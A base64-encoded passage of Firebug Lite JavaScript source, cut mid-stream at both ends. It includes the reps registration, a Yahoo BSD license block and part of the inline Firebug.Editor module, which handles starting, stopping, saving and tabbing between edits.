b24ob2JqZWN0LCB0eXBlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIChvYmplY3QgaW5zdGFuY2VvZiBTdG9yYWdlKTsNCiAgICB9DQoNCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCkZpcmVidWcucmVnaXN0ZXJSZXAoDQogICAgLy90aGlzLm5zSURPTUhpc3RvcnksIC8vIG1ha2UgdGhpcyBlYXJseSB0byBhdm9pZCBleGNlcHRpb25zDQogICAgdGhpcy5VbmRlZmluZWQsDQogICAgdGhpcy5OdWxsLA0KICAgIHRoaXMuTnVtYmVyLA0KICAgIHRoaXMuU3RyaW5nLA0KICAgIHRoaXMuV2luZG93LA0KICAgIC8vdGhpcy5BcHBsaWNhdGlvbkNhY2hlLCAvLyBtdXN0IGNvbWUgYmVmb3JlIEFyciAoYXJyYXkpIGVsc2UgZXhjZXB0aW9ucy4NCiAgICAvL3RoaXMuRXJyb3JNZXNzYWdlLA0KICAgIHRoaXMuRWxlbWVudCwNCiAgICAvL3RoaXMuVGV4dE5vZGUsDQogICAgdGhpcy5Eb2N1bWVudCwNCiAgICB0aGlzLlN0eWxlU2hlZXQsDQogICAgdGhpcy5FdmVudCwNCiAgICAvL3RoaXMuU291cmNlTGluaywNCiAgICAvL3RoaXMuU291cmNlRmlsZSwNCiAgICAvL3RoaXMuU3RhY2tUcmFjZSwNCiAgICAvL3RoaXMuU3RhY2tGcmFtZSwNCiAgICAvL3RoaXMuanNkU3RhY2tGcmFtZSwNCiAgICAvL3RoaXMuanNkU2NyaXB0LA0KICAgIC8vdGhpcy5OZXRGaWxlLA0KICAgIHRoaXMuUHJvcGVydHksDQogICAgdGhpcy5FeGNlcHQsDQogICAgdGhpcy5BcnINCik7DQoNCkZpcmVidWcuc2V0RGVmYXVsdFJlcHModGhpcy5GdW5jLCB0aGlzLk9iaik7DQoNCn19KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovKg0KICogVGhlIGZvbGxvd2luZyBpcyBodHRwOi8vZGV2ZWxvcGVyLnlhaG9vLmNvbS95dWkvbGljZW5zZS50eHQgYW5kIGFwcGxpZXMgdG8gb25seSBjb2RlIGxhYmVsZWQgIllhaG9vIEJTRCBTb3VyY2UiDQogKiBpbiBvbmx5IHRoaXMgZmlsZSByZXBzLmpzLiAgSm9obiBKLiBCYXJ0b24gSnVuZSAyMDA3Lg0KICoNClNvZnR3YXJlIExpY2Vuc2UgQWdyZWVtZW50IChCU0QgTGljZW5zZSkNCg0KQ29weXJpZ2h0IChjKSAyMDA2LCBZYWhvbyEgSW5jLg0KQWxsIHJpZ2h0cyByZXNlcnZlZC4NCg0KUmVkaXN0cmlidXRpb24gYW5kIHVzZSBvZiB0aGlzIHNvZnR3YXJlIGluIHNvdXJjZSBhbmQgYmluYXJ5IGZvcm1zLCB3aXRoIG9yIHdpdGhvdXQgbW9kaWZpY2F0aW9uLCBhcmUNCnBlcm1pdHRlZCBwcm92aWRlZCB0aGF0IHRoZSBmb2xsb3dpbmcgY29uZGl0aW9ucyBhcmUgbWV0Og0KDQoqIFJlZGlzdHJpYnV0aW9ucyBvZiBzb3VyY2UgY29kZSBtdXN0IHJldGFpbiB0aGUgYWJvdmUNCiAgY29weXJpZ2h0IG5vdGljZSwgdGhpcyBsaXN0IG9mIGNvbmRpdGlvbnMgYW5kIHRoZQ0KICBmb2xsb3dpbmcgZGlzY2xhaW1lci4NCg0KKiBSZWRpc3RyaWJ1dGlvbnMgaW4gYmluYXJ5IGZvcm0gbXVzdCByZXByb2R1Y2UgdGhlIGFib3ZlDQogIGNvcHlyaWdodCBub3RpY2UsIHRoaXMgbGlzdCBvZiBjb25kaXRpb25zIGFuZCB0aGUNCiAgZm9sbG93aW5nIGRpc2NsYWltZXIgaW4gdGhlIGRvY3VtZW50YXRpb24gYW5kL29yIG90aGVyDQogIG1hdGVyaWFscyBwcm92aWRlZCB3aXRoIHRoZSBkaXN0cmlidXRpb24uDQoNCiogTmVpdGhlciB0aGUgbmFtZSBvZiBZYWhvbyEgSW5jLiBub3IgdGhlIG5hbWVzIG9mIGl0cw0KICBjb250cmlidXRvcnMgbWF5IGJlIHVzZWQgdG8gZW5kb3JzZSBvciBwcm9tb3RlIHByb2R1Y3RzDQogIGRlcml2ZWQgZnJvbSB0aGlzIHNvZnR3YXJlIHdpdGhvdXQgc3BlY2lmaWMgcHJpb3INCiAgd3JpdHRlbiBwZXJtaXNzaW9uIG9mIFlhaG9vISBJbmMuDQoNClRISVMgU09GVFdBUkUgSVMgUFJPVklERUQgQlkgVEhFIENPUFlSSUdIVCBIT0xERVJTIEFORCBDT05UUklCVVRPUlMgIkFTIElTIiBBTkQgQU5ZIEVYUFJFU1MgT1IgSU1QTElFRA0KV0FSUkFOVElFUywgSU5DTFVESU5HLCBCVVQgTk9UIExJTUlURUQgVE8sIFRIRSBJTVBMSUVEIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZIEFORCBGSVRORVNTIEZPUiBBDQpQQVJUSUNVTEFSIFBVUlBPU0UgQVJFIERJU0NMQUlNRUQuIElOIE5PIEVWRU5UIFNIQUxMIFRIRSBDT1BZUklHSFQgT1dORVIgT1IgQ09OVFJJQlVUT1JTIEJFIExJQUJMRSBGT1INCkFOWSBESVJFQ1QsIElORElSRUNULCBJTkNJREVOVEFMLCBTUEVDSUFMLCBFWEVNUExBUlksIE9SIENPTlNFUVVFTlRJQUwgREFNQUdFUyAoSU5DTFVESU5HLCBCVVQgTk9UDQpMSU1JVEVEIFRPLCBQUk9DVVJFTUVOVCBPRiBTVUJTVElUVVRFIEdPT0RTIE9SIFNFUlZJQ0VTOyBMT1NTIE9GIFVTRSwgREFUQSwgT1IgUFJPRklUUzsgT1IgQlVTSU5FU1MNCklOVEVSUlVQVElPTikgSE9XRVZFUiBDQVVTRUQgQU5EIE9OIEFOWSBUSEVPUlkgT0YgTElBQklMSVRZLCBXSEVUSEVSIElOIENPTlRSQUNULCBTVFJJQ1QgTElBQklMSVRZLCBPUg0KVE9SVCAoSU5DTFVESU5HIE5FR0xJR0VOQ0UgT1IgT1RIRVJXSVNFKSBBUklTSU5HIElOIEFOWSBXQVkgT1VUIE9GIFRIRSBVU0UgT0YgVEhJUyBTT0ZUV0FSRSwgRVZFTiBJRg0KQURWSVNFRCBPRiBUSEUgUE9TU0lCSUxJVFkgT0YgU1VDSCBEQU1BR0UuDQogKiAvDQogKi8NCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ29uc3RhbnRzDQoNCnZhciBzYXZlVGltZW91dCA9IDQwMDsNCnZhciBwYWdlQW1vdW50ID0gMTA7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gR2xvYmFscw0KDQp2YXIgY3VycmVudFRhcmdldCA9IG51bGw7DQp2YXIgY3VycmVudEdyb3VwID0gbnVsbDsNCnZhciBjdXJyZW50UGFuZWwgPSBudWxsOw0KdmFyIGN1cnJlbnRFZGl0b3IgPSBudWxsOw0KDQp2YXIgZGVmYXVsdEVkaXRvciA9IG51bGw7DQoNCnZhciBvcmlnaW5hbENsYXNzTmFtZSA9IG51bGw7DQoNCnZhciBvcmlnaW5hbFZhbHVlID0gbnVsbDsNCnZhciBkZWZhdWx0VmFsdWUgPSBudWxsOw0KdmFyIHByZXZpb3VzVmFsdWUgPSBudWxsOw0KDQp2YXIgaW52YWxpZEVkaXRvciA9IGZhbHNlOw0KdmFyIGlnbm9yZU5leHRJbnB1dCA9IGZhbHNlOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5FZGl0b3IgPSBleHRlbmQoRmlyZWJ1Zy5Nb2R1bGUsDQp7DQogICAgc3VwcG9ydHNTdG9wRXZlbnQ6IHRydWUsDQoNCiAgICBkaXNwYXRjaE5hbWU6ICJlZGl0b3IiLA0KICAgIHRhYkNoYXJhY3RlcjogIiAgICAiLA0KDQogICAgc3RhcnRFZGl0aW5nOiBmdW5jdGlvbih0YXJnZXQsIHZhbHVlLCBlZGl0b3IpDQogICAgew0KICAgICAgICB0aGlzLnN0b3BFZGl0aW5nKCk7DQoNCiAgICAgICAgaWYgKGhhc0NsYXNzKHRhcmdldCwgImluc2VydEJlZm9yZSIpIHx8IGhhc0NsYXNzKHRhcmdldCwgImluc2VydEFmdGVyIikpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdmFyIHBhbmVsID0gRmlyZWJ1Zy5nZXRFbGVtZW50UGFuZWwodGFyZ2V0KTsNCiAgICAgICAgaWYgKCFwYW5lbC5lZGl0YWJsZSkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRURJVE9SKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImVkaXRvci5zdGFydEVkaXRpbmcgIiArIHZhbHVlLCB0YXJnZXQpOw0KDQogICAgICAgIGRlZmF1bHRWYWx1ZSA9IHRhcmdldC5nZXRBdHRyaWJ1dGUoImRlZmF1bHRWYWx1ZSIpOw0KICAgICAgICBpZiAodmFsdWUgPT0gdW5kZWZpbmVkKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdGV4dENvbnRlbnQgPSBpc0lFID8gImlubmVyVGV4dCIgOiAidGV4dENvbnRlbnQiOw0KICAgICAgICAgICAgdmFsdWUgPSB0YXJnZXRbdGV4dENvbnRlbnRdOw0KICAgICAgICAgICAgaWYgKHZhbHVlID09IGRlZmF1bHRWYWx1ZSkNCiAgICAgICAgICAgICAgICB2YWx1ZSA9ICIiOw0KICAgICAgICB9DQoNCiAgICAgICAgb3JpZ2luYWxWYWx1ZSA9IHByZXZpb3VzVmFsdWUgPSB2YWx1ZTsNCg0KICAgICAgICBpbnZhbGlkRWRpdG9yID0gZmFsc2U7DQogICAgICAgIGN1cnJlbnRUYXJnZXQgPSB0YXJnZXQ7DQogICAgICAgIGN1cnJlbnRQYW5lbCA9IHBhbmVsOw0KICAgICAgICBjdXJyZW50R3JvdXAgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiZWRpdEdyb3VwIik7DQoNCiAgICAgICAgY3VycmVudFBhbmVsLmVkaXRpbmcgPSB0cnVlOw0KDQogICAgICAgIHZhciBwYW5lbEVkaXRvciA9IGN1cnJlbnRQYW5lbC5nZXRFZGl0b3IodGFyZ2V0LCB2YWx1ZSk7DQogICAgICAgIGN1cnJlbnRFZGl0b3IgPSBlZGl0b3IgPyBlZGl0b3IgOiBwYW5lbEVkaXRvcjsNCiAgICAgICAgaWYgKCFjdXJyZW50RWRpdG9yKQ0KICAgICAgICAgICAgY3VycmVudEVkaXRvciA9IGdldERlZmF1bHRFZGl0b3IoY3VycmVudFBhbmVsKTsNCg0KICAgICAgICB2YXIgaW5saW5lUGFyZW50ID0gZ2V0SW5saW5lUGFyZW50KHRhcmdldCk7DQogICAgICAgIHZhciB0YXJnZXRTaXplID0gZ2V0T2Zmc2V0U2l6ZShpbmxpbmVQYXJlbnQpOw0KDQogICAgICAgIHNldENsYXNzKHBhbmVsLnBhbmVsTm9kZSwgImVkaXRpbmciKTsNCiAgICAgICAgc2V0Q2xhc3ModGFyZ2V0LCAiZWRpdGluZyIpOw0KICAgICAgICBpZiAoY3VycmVudEdyb3VwKQ0KICAgICAgICAgICAgc2V0Q2xhc3MoY3VycmVudEdyb3VwLCAiZWRpdGluZyIpOw0KDQogICAgICAgIGN1cnJlbnRFZGl0b3Iuc2hvdyh0YXJnZXQsIGN1cnJlbnRQYW5lbCwgdmFsdWUsIHRhcmdldFNpemUpOw0KICAgICAgICAvL2Rpc3BhdGNoKHRoaXMuZmJMaXN0ZW5lcnMsICJvbkJlZ2luRWRpdGluZyIsIFtjdXJyZW50UGFuZWwsIGN1cnJlbnRFZGl0b3IsIHRhcmdldCwgdmFsdWVdKTsNCiAgICAgICAgY3VycmVudEVkaXRvci5iZWdpbkVkaXRpbmcodGFyZ2V0LCB2YWx1ZSk7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19FRElUT1IpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiRWRpdG9yIHN0YXJ0IHBhbmVsICIrY3VycmVudFBhbmVsLm5hbWUpOw0KICAgICAgICB0aGlzLmF0dGFjaExpc3RlbmVycyhjdXJyZW50RWRpdG9yLCBwYW5lbC5jb250ZXh0KTsNCiAgICB9LA0KDQogICAgc3RvcEVkaXRpbmc6IGZ1bmN0aW9uKGNhbmNlbCkNCiAgICB7DQogICAgICAgIGlmICghY3VycmVudFRhcmdldCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRURJVE9SKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImVkaXRvci5zdG9wRWRpdGluZyBjYW5jZWw6IiArIGNhbmNlbCsiIHNhdmVUaW1lb3V0OiAiK3RoaXMuc2F2ZVRpbWVvdXQpOw0KDQogICAgICAgIGNsZWFyVGltZW91dCh0aGlzLnNhdmVUaW1lb3V0KTsNCiAgICAgICAgZGVsZXRlIHRoaXMuc2F2ZVRpbWVvdXQ7DQoNCiAgICAgICAgdGhpcy5kZXRhY2hMaXN0ZW5lcnMoY3VycmVudEVkaXRvciwgY3VycmVudFBhbmVsLmNvbnRleHQpOw0KDQogICAgICAgIHJlbW92ZUNsYXNzKGN1cnJlbnRQYW5lbC5wYW5lbE5vZGUsICJlZGl0aW5nIik7DQogICAgICAgIHJlbW92ZUNsYXNzKGN1cnJlbnRUYXJnZXQsICJlZGl0aW5nIik7DQogICAgICAgIGlmIChjdXJyZW50R3JvdXApDQogICAgICAgICAgICByZW1vdmVDbGFzcyhjdXJyZW50R3JvdXAsICJlZGl0aW5nIik7DQoNCiAgICAgICAgdmFyIHZhbHVlID0gY3VycmVudEVkaXRvci5nZXRWYWx1ZSgpOw0KICAgICAgICBpZiAodmFsdWUgPT0gZGVmYXVsdFZhbHVlKQ0KICAgICAgICAgICAgdmFsdWUgPSAiIjsNCg0KICAgICAgICB2YXIgcmVtb3ZlR3JvdXAgPSBjdXJyZW50RWRpdG9yLmVuZEVkaXRpbmcoY3VycmVudFRhcmdldCwgdmFsdWUsIGNhbmNlbCk7DQoNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChjYW5jZWwpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25JbmxpbmVFZGl0b3JDbG9zZScsIFtjdXJyZW50UGFuZWwsIGN1cnJlbnRUYXJnZXQsIHJlbW92ZUdyb3VwICYmICFvcmlnaW5hbFZhbHVlXSk7DQogICAgICAgICAgICAgICAgaWYgKHZhbHVlICE9IG9yaWdpbmFsVmFsdWUpDQogICAgICAgICAgICAgICAgICAgIHRoaXMuc2F2ZUVkaXRBbmROb3RpZnlMaXN0ZW5lcnMoY3VycmVudFRhcmdldCwgb3JpZ2luYWxWYWx1ZSwgcHJldmlvdXNWYWx1ZSk7DQoNCiAgICAgICAgICAgICAgICBpZiAocmVtb3ZlR3JvdXAgJiYgIW9yaWdpbmFsVmFsdWUgJiYgY3VycmVudEdyb3VwKQ0KICAgICAgICAgICAgICAgICAgICBjdXJyZW50R3JvdXAucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChjdXJyZW50R3JvdXApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAoIXZhbHVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuc2F2ZUVkaXRBbmROb3RpZnlMaXN0ZW5lcnMoY3VycmVudFRhcmdldCwgbnVsbCwgcHJldmlvdXNWYWx1ZSk7DQoNCiAgICAgICAgICAgICAgICBpZiAocmVtb3ZlR3JvdXAgJiYgY3VycmVudEdyb3VwKQ0KICAgICAgICAgICAgICAgICAgICBjdXJyZW50R3JvdXAucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChjdXJyZW50R3JvdXApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHRoaXMuc2F2ZSh2YWx1ZSk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgew0KICAgICAgICAgICAgLy90aHJvdyBleGMubWVzc2FnZTsNCiAgICAgICAgICAgIC8vRVJST1IoZXhjKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGN1cnJlbnRFZGl0b3IuaGlkZSgpOw0KICAgICAgICBjdXJyZW50UGFuZWwuZWRpdGluZyA9IGZhbHNlOw0KDQogICAgICAgIC8vZGlzcGF0Y2godGhpcy5mYkxpc3RlbmVycywgIm9uU3RvcEVkaXQiLCBbY3VycmVudFBhbmVsLCBjdXJyZW50RWRpdG9yLCBjdXJyZW50VGFyZ2V0XSk7DQogICAgICAgIC8vaWYgKEZCVHJhY2UuREJHX0VESVRPUikNCiAgICAgICAgLy8gICAgRkJUcmFjZS5zeXNvdXQoIkVkaXRvciBzdG9wIHBhbmVsICIrY3VycmVudFBhbmVsLm5hbWUpOw0KICAgICAgICANCiAgICAgICAgY3VycmVudFRhcmdldCA9IG51bGw7DQogICAgICAgIGN1cnJlbnRHcm91cCA9IG51bGw7DQogICAgICAgIGN1cnJlbnRQYW5lbCA9IG51bGw7DQogICAgICAgIGN1cnJlbnRFZGl0b3IgPSBudWxsOw0KICAgICAgICBvcmlnaW5hbFZhbHVlID0gbnVsbDsNCiAgICAgICAgaW52YWxpZEVkaXRvciA9IGZhbHNlOw0KDQogICAgICAgIHJldHVybiB2YWx1ZTsNCiAgICB9LA0KDQogICAgY2FuY2VsRWRpdGluZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMuc3RvcEVkaXRpbmcodHJ1ZSk7DQogICAgfSwNCg0KICAgIHVwZGF0ZTogZnVuY3Rpb24oc2F2ZU5vdykNCiAgICB7DQogICAgICAgIGlmICh0aGlzLnNhdmVUaW1lb3V0KQ0KICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHRoaXMuc2F2ZVRpbWVvdXQpOw0KDQogICAgICAgIGludmFsaWRFZGl0b3IgPSB0cnVlOw0KDQogICAgICAgIGN1cnJlbnRFZGl0b3IubGF5b3V0KCk7DQoNCiAgICAgICAgaWYgKHNhdmVOb3cpDQogICAgICAgICAgICB0aGlzLnNhdmUoKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY29udGV4dCA9IGN1cnJlbnRQYW5lbC5jb250ZXh0Ow0KICAgICAgICAgICAgdGhpcy5zYXZlVGltZW91dCA9IGNvbnRleHQuc2V0VGltZW91dChiaW5kRml4ZWQodGhpcy5zYXZlLCB0aGlzKSwgc2F2ZVRpbWVvdXQpOw0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VESVRPUikNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZWRpdG9yLnVwZGF0ZSBzYXZlVGltZW91dDogIit0aGlzLnNhdmVUaW1lb3V0KTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzYXZlOiBmdW5jdGlvbih2YWx1ZSkNCiAgICB7DQogICAgICAgIGlmICghaW52YWxpZEVkaXRvcikNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAodmFsdWUgPT0gdW5kZWZpbmVkKQ0KICAgICAgICAgICAgdmFsdWUgPSBjdXJyZW50RWRpdG9yLmdldFZhbHVlKCk7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19FRElUT1IpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZWRpdG9yLnNhdmUgc2F2ZVRpbWVvdXQ6ICIrdGhpcy5zYXZlVGltZW91dCsiIGN1cnJlbnRQYW5lbDogIisoY3VycmVudFBhbmVsP2N1cnJlbnRQYW5lbC5uYW1lOiJudWxsIikpOw0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5zYXZlRWRpdEFuZE5vdGlmeUxpc3RlbmVycyhjdXJyZW50VGFyZ2V0LCB2YWx1ZSwgcHJldmlvdXNWYWx1ZSk7DQoNCiAgICAgICAgICAgIHByZXZpb3VzVmFsdWUgPSB2YWx1ZTsNCiAgICAgICAgICAgIGludmFsaWRFZGl0b3IgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJlZGl0b3Iuc2F2ZSBGQUlMUyAiK2V4YywgZXhjKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzYXZlRWRpdEFuZE5vdGlmeUxpc3RlbmVyczogZnVuY3Rpb24oY3VycmVudFRhcmdldCwgdmFsdWUsIHByZXZpb3VzVmFsdWUpDQogICAgew0KICAgICAgICBjdXJyZW50RWRpdG9yLnNhdmVFZGl0KGN1cnJlbnRUYXJnZXQsIHZhbHVlLCBwcmV2aW91c1ZhbHVlKTsNCiAgICAgICAgLy9kaXNwYXRjaCh0aGlzLmZiTGlzdGVuZXJzLCAib25TYXZlRWRpdCIsIFtjdXJyZW50UGFuZWwsIGN1cnJlbnRFZGl0b3IsIGN1cnJlbnRUYXJnZXQsIHZhbHVlLCBwcmV2aW91c1ZhbHVlXSk7DQogICAgfSwNCg0KICAgIHNldEVkaXRUYXJnZXQ6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICBpZiAoIWVsZW1lbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbklubGluZUVkaXRvckNsb3NlJywgW2N1cnJlbnRQYW5lbCwgY3VycmVudFRhcmdldCwgdHJ1ZV0pOw0KICAgICAgICAgICAgdGhpcy5zdG9wRWRpdGluZygpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGhhc0NsYXNzKGVsZW1lbnQsICJpbnNlcnRCZWZvcmUiKSkNCiAgICAgICAgICAgIHRoaXMuaW5zZXJ0Um93KGVsZW1lbnQsICJiZWZvcmUiKTsNCiAgICAgICAgZWxzZSBpZiAoaGFzQ2xhc3MoZWxlbWVudCwgImluc2VydEFmdGVyIikpDQogICAgICAgICAgICB0aGlzLmluc2VydFJvdyhlbGVtZW50LCAiYWZ0ZXIiKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgdGhpcy5zdGFydEVkaXRpbmcoZWxlbWVudCk7DQogICAgfSwNCg0KICAgIHRhYk5leHRFZGl0b3I6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICghY3VycmVudFRhcmdldCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgdmFsdWUgPSBjdXJyZW50RWRpdG9yLmdldFZhbHVlKCk7DQogICAgICAgIHZhciBuZXh0RWRpdGFibGUgPSBjdXJyZW50VGFyZ2V0Ow0KICAgICAgICBkbw0KICAgICAgICB7DQogICAgICAgICAgICBuZXh0RWRpdGFibGUgPSAhdmFsdWUgJiYgY3VycmVudEdyb3VwDQogICAgICAgICAgICAgICAgPyBnZXROZXh0T3V0c2lkZXIobmV4dEVkaXRhYmxlLCBjdXJyZW50R3JvdXApDQogICAgICAgICAgICAgICAgOiBnZXROZXh0QnlDbGFzcyhuZXh0RWRpdGFibGUsICJlZGl0YWJsZSIpOw0KICAgICAgICB9DQogICAgICAgIHdoaWxlIChuZXh0RWRpdGFibGUgJiYgIW5leHRFZGl0YWJsZS5vZmZzZXRIZWlnaHQpOw0KDQogICAgICAgIHRoaXMuc2V0RWRpdFRhcmdldChuZXh0RWRpdGFibGUpOw0KICAgIH0sDQoNCiAgICB0YWJQcmV2aW91c0VkaXRvcjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKCFjdXJyZW50VGFyZ2V0KQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHZhciB2YWx1ZSA9IGN1cnJlbnRFZGl0b3IuZ2V0VmFsdWUoKTsNCiAgICAgICAgdmFyIHByZXZFZGl0YWJsZSA9IGN1cnJlbnRUYXJnZXQ7DQogICAgICAgIGRvDQogICAgICAgIHsNCiAgICAgICAgICAgIHByZXZFZGl0YWJsZSA9ICF2YWx1ZSAmJiBjdXJyZW50R3JvdXANCiAgICAgICAgICAgICAgICA/IGdldFByZXZpb3VzT3V0c2lkZXIocHJldkVkaXRhYmxlLCBjdXJyZW50R3JvdXApDQogICAgICAgICAgICAgICAgOiBnZXRQcmV2aW91c0J5Q2xhc3MocHJldkVkaXRhYmxlLCAiZWRpdGFibGUiKTsNCiAgICAgICAgfQ0KICAgICAgICB3aGlsZSAocHJldkVkaXRhYmxlICYmICFwcmV2RWRpdGFibGUub2Zmc2V0SGVpZ2h0KTsNCg0KICAgICAgICB0aGlzLnNldEVkaXRUYXJnZXQocHJldkVkaXRhYmxlKTsNCiAgICB9LA0KDQogICAgaW5zZXJ0Um93OiBmdW5jdGlvbihyZWxhdGl2ZSwgaW5zZXJ0V2hlcmUpDQogICAgew0KICAgICAgICB2YXIgZ3JvdXAgPQ0KICAgICAgICAgICAgcmVsYXRpdmUgfHwgZ2V0QW5jZXN0b3JCeUNsYXNzKGN1cnJlbnRUYXJnZXQsICJlZGl0R3JvdXAiKSB8fCBjdXJyZW50VGFyZ2V0Ow0KICAgICAgICB2YXIgdmFsdWUgPSB0aGlzLnN0b3BFZGl0aW5nKCk7DQoNCiAgICAgICAgY3VycmVudFBhbmVsID0gRmlyZWJ1Zy5nZXRFbGVtZW50UGFuZWwoZ3JvdXApOw0KDQogICAgICAgIGN1cnJlbnRFZGl0b3IgPSBjdXJyZW50UGFuZWwuZ2V0RWRpdG9yKGdyb3VwLCB2YWx1ZSk7DQogICAgICAgIGlmICghY3VycmVudEVkaXRvcikNCiAgICAgICAgICAgIGN1cnJlbnRFZGl0b3IgPSBnZXREZWZhdWx0RWRpdG9yKGN1cnJlbnRQYW5lbCk7DQoNCiAgICAgICAgY3VycmVudEdyb3VwID0gY3VycmVudEVkaXRvci5pbnNlcnROZXdSb3coZ3JvdXAsIGluc2VydFdoZXJlKTsNCiAgICAgICAgaWYgKCFjdXJyZW50R3JvdXApDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdmFyIGVkaXRhYmxlID0gaGFzQ2xhc3MoY3VycmVudEdyb3VwLCAiZWRpdGFibGUiKQ0KICAgICAgICAgICAgPyBjdXJyZW50R3JvdXANCiAgICAgICAgICAgIDogZ2V0TmV4dEJ5Q2xhc3MoY3VycmVudEdyb3VwLCAiZWRpdGFibGUiKTsNCg0KICAgICAgICBpZiAoZWRpdGFibGUpDQogICAgICAgICAgICB0aGlzLnNldEVkaXRUYXJnZXQoZWRpdGFibGUpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRSb3dGb3JPYmplY3Q6IGZ1bmN0aW9uKHJlbGF0aXZlKQ0KICAgIHsNCiAgICAgICAgdmFyIGNvbnRhaW5lciA9IGdldEFuY2VzdG9yQnlDbGFzcyhyZWxhdGl2ZSwgImluc2VydEludG8iKTsNCiAgICAgICAgaWYgKGNvbnRhaW5lcikNCiAgICAgICAgew0KICAgICAgICAgICAgcmVsYXRpdmUgPSBnZXRDaGlsZEJ5Q2xhc3MoY29udGFpbmVyLCAiaW5zZXJ0QmVmb3JlIik7DQogICAgICAgICAgICBpZiAocmVsYXRpdmUpDQogICAgICAgICAgICAgICAgdGhpcy5pbnNlcnRSb3cocmVsYXRpdmUsICJiZWZvcmUiKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBhdHRhY2hMaXN0ZW5lcnM6IGZ1bmN0aW9uKGVkaXRvciwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB3aW4gPSBpc0lFID8NCiAgICAgICAgICAgICAgICBjdXJyZW50VGFyZ2V0Lm93bmVyRG9jdW1lbnQucGFyZW50V2luZG93IDoNCiAgICAgICAgICAgICAgICBjdXJyZW50VGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXc7DQogICAgICAgIA0KICAgICAgICBhZGRFdmVudCh3aW4sICJyZXNpemUiLCB0aGlzLm9uUmVzaXplKTsNCiAgICAgICAgYWRkRXZlbnQod2luLCAiY